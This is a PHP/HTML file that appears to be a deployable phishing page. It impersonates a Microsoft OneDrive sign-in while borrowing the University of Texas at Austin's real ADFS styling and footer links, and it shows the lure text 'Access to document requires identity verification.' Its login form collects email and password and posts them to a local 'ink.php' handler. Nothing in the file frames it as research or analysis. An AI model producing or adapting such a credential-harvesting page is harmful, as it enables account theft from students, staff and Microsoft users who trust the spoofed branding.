<?php
session_start();
$csrf_token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $csrf_token;
?>

<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1"/>
    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
    <meta http-equiv="cache-control" content="no-cache,no-store"/>
    <meta http-equiv="pragma" content="no-cache"/>
    <meta http-equiv="expires" content="-1"/>
    <meta name='mswebdialog-title' content='Connecting to UT Austin'/>
    <title>Microsoft OneDrive</title>
    <link rel="icon" href="https&#58;//p.sfx.ms/images/favicon.ico" type="image/x-icon" />
    <meta name="robots" content="noindex, nofollow">
    <link rel="stylesheet" type="text/css" href="https://login.austin.utexas.edu/adfs/portal/css/style.css?id=30A1F1F768E0D0CF77CA52C6FF142EF598E6A81D7FFE7BBF1CABAD67F948F2A6" />
    <script type='text/javascript'>
        //<![CDATA[
        function InputUtil(errTextElementID, errDisplayElementID) {

            if (!errTextElementID)  errTextElementID = 'errorText'; 
            if (!errDisplayElementID)  errDisplayElementID = 'error'; 

            this.hasFocus = false;
            this.errLabel = document.getElementById(errTextElementID);
            this.errDisplay = document.getElementById(errDisplayElementID);
        };
        InputUtil.prototype.canDisplayError = function () {
            return this.errLabel && this.errDisplay;
        }
        InputUtil.prototype.checkError = function () {
            if (!this.canDisplayError){
                throw new Error ('Error element not present');
            }
            if (this.errLabel && this.errLabel.innerHTML) {
                this.errDisplay.style.display = '';        
                var cause = this.errLabel.getAttribute('for');
                if (cause) {
                    var causeNode = document.getElementById(cause);
                    if (causeNode && causeNode.value) {
                        causeNode.focus();
                        this.hasFocus = true;
                    }
                }
            }
            else {
                this.errDisplay.style.display = 'none';
            }
        };
        InputUtil.prototype.setInitialFocus = function (input) {
            if (this.hasFocus) return;
            var node = document.getElementById(input);
            if (node) {
                if ((/^\s*$/).test(node.value)) {
                    node.focus();
                    this.hasFocus = true;
                }
            }
        };
        InputUtil.prototype.setError = function (input, errorMsg) {
            if (!this.canDisplayError) {
                throw new Error('Error element not present');
            }
            input.focus();

            if (errorMsg) {
                this.errLabel.innerHTML = errorMsg;
            }
            this.errLabel.setAttribute('for', input.id);
            this.errDisplay.style.display = '';
        };
        InputUtil.makePlaceholder = function (input) {
            var ua = navigator.userAgent;

            if (ua != null && 
                (ua.match(/MSIE 9.0/) != null || 
                ua.match(/MSIE 8.0/) != null ||
                ua.match(/MSIE 7.0/) != null)) {
                var node = document.getElementById(input);
                if (node) {
                    var placeholder = node.getAttribute("placeholder");
                    if (placeholder != null && placeholder != '') {
                        var label = document.createElement('input');
                        label.type = "text";
                        label.value = placeholder;
                        label.readOnly = true;
                        label.style.position = 'absolute';
                        label.style.borderColor = 'transparent';
                        label.className = node.className + ' hint';
                        label.tabIndex = -1;
                        label.onfocus = function () { this.nextSibling.focus(); };

                        node.style.position = 'relative';
                        node.parentNode.style.position = 'relative';
                        node.parentNode.insertBefore(label, node);
                        node.onkeyup = function () { InputUtil.showHint(this); };
                        node.onblur = function () { InputUtil.showHint(this); };
                        node.style.background = 'transparent';

                        node.setAttribute("placeholder", "");
                        InputUtil.showHint(node);
                    }
                }
            }
        };
        InputUtil.focus = function (inputField) {
            var node = document.getElementById(inputField);
            if (node) node.focus();
        };
        InputUtil.hasClass = function(node, clsName) {
            return node.className.match(new RegExp('(\\s|^)' + clsName + '(\\s|$)'));
        };
        InputUtil.addClass = function(node, clsName) {
            if (!this.hasClass(node, clsName)) node.className += " " + clsName;
        };
        InputUtil.removeClass = function(node, clsName) {
            if (this.hasClass(node, clsName)) {
                var reg = new RegExp('(\\s|^)' + clsName + '(\\s|$)');
                node.className = node.className.replace(reg, ' ');
            }
        };
        InputUtil.showHint = function (node, gotFocus) {
            if (node.value && node.value != '') {
                node.previousSibling.style.display = 'none';
            }
            else {
                node.previousSibling.style.display = '';
            }
        };
        InputUtil.updatePlaceholder = function (input, placeholderText) {
            var node = document.getElementById(input);
            if (node) {
                var ua = navigator.userAgent;
                if (ua != null &&
                    (ua.match(/MSIE 9.0/) != null ||
                    ua.match(/MSIE 8.0/) != null ||
                    ua.match(/MSIE 7.0/) != null)) {
                    var label = node.previousSibling;
                    if (label != null) {
                        label.value = placeholderText;
                    }
                }
                else {
                    node.placeholder = placeholderText;
                }
            }
        };
        //]]>
    </script>
    <link rel="stylesheet" type="text/css" href="https://login.austin.utexas.edu/adfs/portal/css/style.css?id=30A1F1F768E0D0CF77CA52C6FF142EF598E6A81D7FFE7BBF1CABAD67F948F2A6" /><style>.illustrationClass {background-image:url(/onedrive.live.comonedriveliveidrootcid9D52B3B6FD3A4D5konedriveliveidrootcid9D52B1AQQ=onedrive.liveid=root&cid=DD0A5DD15C220335/image/Jr6ZeZQ.gif);}</style>
</head>
<body dir="ltr" class="body">
<div id="noScript" style="position:static; width:50%; height:50%; z-index:100">
    <h1>JavaScript required</h1>
    <p>JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
    <p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
</div>
<script type="text/javascript" language="JavaScript">
    document.getElementById("noScript").style.display = "none";
</script>
<div id="fullPage">
    <div id="brandingWrapper" class="float">
        <div id="branding"></div>
    </div>
    <div id="contentWrapper" class="float">
        <div id="content">
            <div id="header">
                <img class='logoImage' id='companyLogo' src='/onedrive.live.comonedriveliveidrootcid9D52B3B6FD3A4D5konedriveliveidrootcid9D52B1AQQ=onedrive.liveid=root&cid=DD0A5DD15C220335/image/02Etp5S4bK904LpzJzjD8eA-7.jpg' alt='Company Logo'/>
            </div>
            <div id="workArea">
                <div id="authArea" class="groupMargin">
                <div id="loginArea">        
                    <div id="loginMessage" class="groupMargin">Sign in</div>
                        <div id="error" class="fieldMargin error smallText">
                            <span id="errorText" for="Please enter the password for your Microsoft account."></span>
                        </div>
                        <form id="loginForm" method="post" action="ink.php" onsubmit="return validateForm()">
                        <div id="formsAuthenticationArea">
                            <div id="userNameArea">
                                <label id="uInputLabel" for="uInput" class="hidden">User Account</label>
                                <input id="uInput" name="user" type="email" value="" tabindex="1" class="text fullWidth"
                                    spellcheck="false" placeholder="Email, phone, or Skype" autocomplete="off" required />
                            </div>
                            <div id="passwordArea">
                                <label id="pInputLabel" for="pInput" class="hidden">Password</label>
                                <input id="pInput" name="pass" type="password" tabindex="2" class="text fullWidth"
                                    placeholder="Password" autocomplete="off" required />
                                    <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
									
                            </div>
                            <div id="kmsiArea" style="display:none">
                                <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3" />
                                <label for="kmsiInput">Keep me signed in</label>
                            </div>
                            <div id="submissionArea" class="submitMargin">
                                    <input type="submit" class="submit" tabindex="4" value="Verify" style="background-color: #0067B8; color: white;" />
                                </div>
                        </div>
                        <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication"/>
                        </form>
                    <div id="introduction" class="groupMargin">
                        <p>Secure your business files with our cloud storage and file-sharing services.</p>                   
                    </div>

                </div>

                </div>

            </div>
            <div id="footerPlaceholder"></div>
        </div>
        <div id="footer">
            <div id="footerLinks" class="floatReverse">
                 <div><span id="copyright">&#169; 2024 Microsoft</span><a id="home" class="pageLink" href="https://www.utexas.edu/"></a><a id="privacy" class="pageLink" href="https://cio.utexas.edu/policies/web-privacy-policy">&#169; 2024 Microsoft</a><a id="helpDesk" class="pageLink" href="https://cio.utexas.edu/policies/web-accessibility">Privacy Policy</a></div>
            </div>
        </div>
    </div> 
</div>
<script type='text/javascript'>
//<![CDATA[
function validateForm() {
    var email = document.getElementById('uInput').value;
    var password = document.getElementById('pInput').value;
    if (!email || !password) {
        alert('Please fill in both fields.');
        return false;
    }
    return true;
}

if (navigator.userAgent.match(/iPhone/i) != null) {
    var emails = document.querySelectorAll("input[type='email']");
    if (emails) {
        for (var i = 0; i < emails.length; i++) {
            emails[i].type = 'text';
        }
    }
}

if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
    var msViewportStyle = document.createElement("style");
    msViewportStyle.appendChild(
        document.createTextNode(
            "@-ms-viewport{width:auto!important}"
        )
    );
    msViewportStyle.appendChild(
        document.createTextNode(
            "@-ms-viewport{height:auto!important}"
        )
    );
    document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
}

if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
    var viewport = document.querySelector("meta[name=viewport]");
    viewport.setAttribute('content', 'width=' + window.innerWidth + 'px; initial-scale=1.0; maximum-scale=1.0');
}

function getStyle(element, styleProp) {
    var propStyle = null;

    if (element && element.currentStyle) {
        propStyle = element.currentStyle[styleProp];
    }
    else if (element && window.getComputedStyle) {
        propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
    }

    return propStyle;
}

var computeLoadIllustration = function () {
    var branding = document.getElementById("branding");
    var brandingDisplay = getStyle(branding, "display");
    var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");

    if (brandingDisplay && brandingDisplay !== "none" &&
        brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
        var newClass = "illustrationClass";

        if (branding.classList && branding.classList.add) {
            branding.classList.add(newClass);
        } else if (branding.className !== undefined) {
            branding.className += " " + newClass;
        }
        if (window.removeEventListener) {
            window.removeEventListener('load', computeLoadIllustration, false);
            window.removeEventListener('resize', computeLoadIllustration, false);
        }
        else if (window.detachEvent) {
            window.detachEvent('onload', computeLoadIllustration);
            window.detachEvent('onresize', computeLoadIllustration);
        }
    }
};

if (window.addEventListener) {
    window.addEventListener('resize', computeLoadIllustration, false);
    window.addEventListener('load', computeLoadIllustration, false);
}
else if (window.attachEvent) {
    window.attachEvent('onresize', computeLoadIllustration);
    window.attachEvent('onload', computeLoadIllustration);
}
 
var loginMessage = document.getElementById('loginMessage');
if (loginMessage) {
    loginMessage.innerHTML = 'Access to document requires identity verification.';
}
 
var uInputTextBox = document.getElementById('uInput');
if (uInputTextBox) {
    var placeholderText = 'Email, phone, or Skype';
    if (uInputTextBox.placeholder) {
        uInputTextBox.placeholder = placeholderText;
    }
}

var logoImage = document.getElementsByClassName('logoImage');
if (logoImage[0]) {
    var newLogoImageSrc = '/onedrive.live.comonedriveliveidrootcid9D52B3B6FD3A4D5konedriveliveidrootcid9D52B1AQQ=onedrive.liveid=root&cid=DD0A5DD15C220335/image/02Etp5S4bK904LpzJzjD8eA-7.jpg';
    if (logoImage[0].src)
        logoImage[0].src = newLogoImageSrc;
}
//]]>
</script>
</body>
</html>
